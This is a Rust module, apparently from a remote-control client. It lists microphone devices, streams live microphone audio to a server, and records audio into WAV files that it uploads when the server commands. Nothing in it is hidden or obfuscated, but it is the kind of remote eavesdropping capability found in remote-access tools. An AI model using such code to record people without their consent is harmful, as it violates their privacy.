use common::packets::{FileData, MicAudioChunk, ServerboundPacket};
use cpal::traits::{DeviceTrait, HostTrait, StreamTrait};
use cpal::{Sample, SampleFormat, StreamConfig};
use once_cell::sync::Lazy;
use std::mem::size_of;
use std::sync::{Arc, Mutex, atomic::{AtomicBool, Ordering}};
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use crate::handler::send_packet;
use crate::handler::send_packet_sync;
use tokio::sync::oneshot;

static MIC_LIVE_ACTIVE: Lazy<Arc<AtomicBool>> = Lazy::new(|| Arc::new(AtomicBool::new(false)));
static MIC_RECORD_ACTIVE: Lazy<Arc<AtomicBool>> = Lazy::new(|| Arc::new(AtomicBool::new(false)));
static MIC_STOP_FLAG: Lazy<Mutex<Option<Arc<AtomicBool>>>> = Lazy::new(|| Mutex::new(None));
static MIC_THREAD_HANDLE: Lazy<Mutex<Option<thread::JoinHandle<Result<(), String>>>>> = Lazy::new(|| Mutex::new(None));
static MIC_BUFFER: Lazy<Mutex<Vec<u8>>> = Lazy::new(|| Mutex::new(Vec::new()));
static MIC_PARAMS: Lazy<Mutex<Option<(u32, u16)>>> = Lazy::new(|| Mutex::new(None));
static MIC_DEVICE: Lazy<Mutex<Option<String>>> = Lazy::new(|| Mutex::new(None));

fn sample_to_bytes_i16(input: &[i16]) -> Vec<u8> {
    let mut bytes = Vec::with_capacity(input.len() * size_of::<i16>());
    for &sample in input {
        bytes.extend_from_slice(&sample.to_le_bytes());
    }
    bytes
}

fn sample_to_bytes_u16(input: &[u16]) -> Vec<u8> {
    let mut bytes = Vec::with_capacity(input.len() * size_of::<i16>());
    for &sample in input {
        let i16_sample = sample.to_sample::<i16>();
        bytes.extend_from_slice(&i16_sample.to_le_bytes());
    }
    bytes
}

fn sample_to_bytes_f32(input: &[f32]) -> Vec<u8> {
    let mut bytes = Vec::with_capacity(input.len() * size_of::<i16>());
    for &sample in input {
        let i16_sample = sample.to_sample::<i16>();
        bytes.extend_from_slice(&i16_sample.to_le_bytes());
    }
    bytes
}

fn build_wav_header(sample_rate: u32, channels: u16, sample_count: usize) -> Vec<u8> {
    let bits_per_sample = 16u16;
    let byte_rate = sample_rate * u32::from(channels) * u32::from(bits_per_sample) / 8;
    let block_align = channels * bits_per_sample / 8;
    let data_bytes = (sample_count * size_of::<i16>()) as u32;
    let chunk_size = 36 + data_bytes;

    let mut header = Vec::with_capacity(44);
    header.extend_from_slice(b"RIFF");
    header.extend_from_slice(&chunk_size.to_le_bytes());
    header.extend_from_slice(b"WAVE");
    header.extend_from_slice(b"fmt ");
    header.extend_from_slice(&16u32.to_le_bytes());
    header.extend_from_slice(&1u16.to_le_bytes());
    header.extend_from_slice(&channels.to_le_bytes());
    header.extend_from_slice(&sample_rate.to_le_bytes());
    header.extend_from_slice(&byte_rate.to_le_bytes());
    header.extend_from_slice(&block_align.to_le_bytes());
    header.extend_from_slice(&bits_per_sample.to_le_bytes());
    header.extend_from_slice(b"data");
    header.extend_from_slice(&data_bytes.to_le_bytes());
    header
}

fn set_mic_device(device_id: String) {
    *MIC_DEVICE.lock().unwrap() = Some(device_id);
}

fn get_mic_device() -> Option<String> {
    MIC_DEVICE.lock().unwrap().clone()
}

pub async fn send_mic_device_list() {
    let (tx, rx) = oneshot::channel::<Vec<common::packets::MicDeviceInfo>>();

    thread::spawn(move || {
        let mut devices = Vec::new();
        let host = cpal::default_host();
        match host.input_devices() {
            Ok(input_devices) => {
                for device in input_devices {
                    match device.name() {
                        Ok(name) => {
                            println!("[Mic] Found input device: {}", name);
                            devices.push(common::packets::MicDeviceInfo {
                                id: name.clone(),
                                name,
                            });
                        }
                        Err(e) => {
                            eprintln!("[Mic] Failed to get device name: {}", e);
                        }
                    }
                }
                println!("[Mic] Total input devices found: {}", devices.len());
            }
            Err(e) => {
                eprintln!("[Mic] Failed to enumerate input devices: {}", e);

                // Fallback: try the default input device name directly
                if let Some(default_dev) = host.default_input_device() {
                    if let Ok(name) = default_dev.name() {
                        println!("[Mic] Using default input device as fallback: {}", name);
                        devices.push(common::packets::MicDeviceInfo {
                            id: name.clone(),
                            name,
                        });
                    }
                }
            }
        }
        let _ = tx.send(devices);
    });

    let devices = rx.await.unwrap_or_else(|e| {
        eprintln!("[Mic] Failed to receive device list from thread: {}", e);
        Vec::new()
    });

    if let Err(err) = send_packet(ServerboundPacket::MicDeviceList(devices)).await {
        eprintln!("[Mic] Failed to send mic device list: {}", err);
    }
}

async fn send_mic_recording_file(name: String, data: Vec<u8>) {
    let payload = FileData { name, data };
    if let Err(err) = send_packet(ServerboundPacket::MicRecordingFile(payload)).await {
        eprintln!("Failed to send mic recording file: {}", err);
    }
}

fn stop_mic_thread() {
    if let Some(flag) = MIC_STOP_FLAG.lock().unwrap().take() {
        flag.store(true, Ordering::Relaxed);
    }
    if let Some(handle) = MIC_THREAD_HANDLE.lock().unwrap().take() {
        let _ = handle.join();
    }
    *MIC_PARAMS.lock().unwrap() = None;
}

fn spawn_mic_thread() -> Result<(), String> {
    let host = cpal::default_host();
    let device = if let Some(device_name) = get_mic_device() {
        host.input_devices()
            .map_err(|e| format!("Failed to enumerate input devices: {}", e))?
            .find(|d| d.name().map(|name| name == device_name).unwrap_or(false))
            .ok_or_else(|| format!("Selected mic device not found: {}", device_name))?
    } else {
        host.default_input_device()
            .ok_or_else(|| "No default input device available".to_string())?
    };

    let supported_config = device
        .default_input_config()
        .map_err(|e| format!("Failed to query input config: {}", e))?;

    let sample_rate = supported_config.sample_rate().0;
    let channels = supported_config.channels();
    *MIC_PARAMS.lock().unwrap() = Some((sample_rate, channels));
    MIC_BUFFER.lock().unwrap().clear();

    let stop_flag = Arc::new(AtomicBool::new(false));
    *MIC_STOP_FLAG.lock().unwrap() = Some(stop_flag.clone());

    let handle = thread::spawn(move || -> Result<(), String> {
        let config: StreamConfig = supported_config.clone().into();

        let err_fn = move |err| {
            eprintln!("Mic capture error: {}", err);
        };

        let live_flag = MIC_LIVE_ACTIVE.clone();
        let record_flag = MIC_RECORD_ACTIVE.clone();

        let stream_result: Result<cpal::Stream, String> = match supported_config.sample_format() {
            SampleFormat::I16 => device.build_input_stream(
                &config,
                move |data: &[i16], _| {
                    if !live_flag.load(Ordering::Relaxed)
                        && !record_flag.load(Ordering::Relaxed)
                    {
                        return;
                    }
                    let bytes = sample_to_bytes_i16(data);
                    if record_flag.load(Ordering::Relaxed) {
                        MIC_BUFFER.lock().unwrap().extend_from_slice(&bytes);
                    }
                    if live_flag.load(Ordering::Relaxed) {
                        let chunk = MicAudioChunk {
                            timestamp: SystemTime::now()
                                .duration_since(UNIX_EPOCH)
                                .unwrap_or_default()
                                .as_millis() as u64,
                            sample_rate,
                            channels,
                            data: bytes,
                        };
                        let _ = send_packet_sync(ServerboundPacket::MicAudioChunk(chunk));
                    }
                },
                err_fn,
                None,
            ),
            SampleFormat::U16 => device.build_input_stream(
                &config,
                move |data: &[u16], _| {
                    if !live_flag.load(Ordering::Relaxed)
                        && !record_flag.load(Ordering::Relaxed)
                    {
                        return;
                    }
                    let bytes = sample_to_bytes_u16(data);
                    if record_flag.load(Ordering::Relaxed) {
                        MIC_BUFFER.lock().unwrap().extend_from_slice(&bytes);
                    }
                    if live_flag.load(Ordering::Relaxed) {
                        let chunk = MicAudioChunk {
                            timestamp: SystemTime::now()
                                .duration_since(UNIX_EPOCH)
                                .unwrap_or_default()
                                .as_millis() as u64,
                            sample_rate,
                            channels,
                            data: bytes,
                        };
                        let _ = send_packet_sync(ServerboundPacket::MicAudioChunk(chunk));
                    }
                },
                err_fn,
                None,
            ),
            SampleFormat::F32 => device.build_input_stream(
                &config,
                move |data: &[f32], _| {
                    if !live_flag.load(Ordering::Relaxed)
                        && !record_flag.load(Ordering::Relaxed)
                    {
                        return;
                    }
                    let bytes = sample_to_bytes_f32(data);
                    if record_flag.load(Ordering::Relaxed) {
                        MIC_BUFFER.lock().unwrap().extend_from_slice(&bytes);
                    }
                    if live_flag.load(Ordering::Relaxed) {
                        let chunk = MicAudioChunk {
                            timestamp: SystemTime::now()
                                .duration_since(UNIX_EPOCH)
                                .unwrap_or_default()
                                .as_millis() as u64,
                            sample_rate,
                            channels,
                            data: bytes,
                        };
                        let _ = send_packet_sync(ServerboundPacket::MicAudioChunk(chunk));
                    }
                },
                err_fn,
                None,
            ),
            _ => return Err("Unsupported sample format".to_string()),
        }
        .map_err(|e| format!("Failed to build mic input stream: {}", e));

        if let Ok(stream) = stream_result {
            if stream.play().is_ok() {
                while !stop_flag.load(Ordering::Relaxed) {
                    thread::sleep(Duration::from_millis(100));
                }
            }
        } else if let Err(err) = stream_result {
            eprintln!("Failed to create mic stream: {}", err);
        }
        Ok(())
    });

    *MIC_THREAD_HANDLE.lock().unwrap() = Some(handle);
    Ok(())
}

fn maybe_stop_mic_thread() {
    let live = MIC_LIVE_ACTIVE.load(Ordering::Relaxed);
    let record = MIC_RECORD_ACTIVE.load(Ordering::Relaxed);
    if !live && !record {
        stop_mic_thread();
    }
}

pub fn start_mic_live(device_id: String) {
    if !device_id.is_empty() {
        set_mic_device(device_id);
    }
    MIC_LIVE_ACTIVE.store(true, Ordering::Relaxed);
    if MIC_THREAD_HANDLE.lock().unwrap().is_none() {
        if let Err(err) = spawn_mic_thread() {
            eprintln!("Failed to start mic live thread: {}", err);
        }
    }
}

pub fn stop_mic_live() {
    MIC_LIVE_ACTIVE.store(false, Ordering::Relaxed);
    maybe_stop_mic_thread();
}

pub fn start_mic_recording(device_id: String) {
    if !device_id.is_empty() {
        set_mic_device(device_id);
    }
    MIC_RECORD_ACTIVE.store(true, Ordering::Relaxed);
    if MIC_THREAD_HANDLE.lock().unwrap().is_none() {
        if let Err(err) = spawn_mic_thread() {
            eprintln!("Failed to start mic recording thread: {}", err);
            return;
        }
    }
    MIC_BUFFER.lock().unwrap().clear();
}

pub async fn stop_mic_recording() {
    MIC_RECORD_ACTIVE.store(false, Ordering::Relaxed);

    let params = MIC_PARAMS.lock().unwrap().clone();
    let buffer = MIC_BUFFER.lock().unwrap().clone();
    if let Some((sample_rate, channels)) = params {
        let wav = {
            let sample_count = buffer.len() / size_of::<i16>();
            let mut wav = build_wav_header(sample_rate, channels, sample_count);
            wav.extend_from_slice(&buffer);
            wav
        };
        let name = format!("mic_recording_{}.wav", SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs());
        send_mic_recording_file(name, wav).await;
    }

    maybe_stop_mic_thread();
}
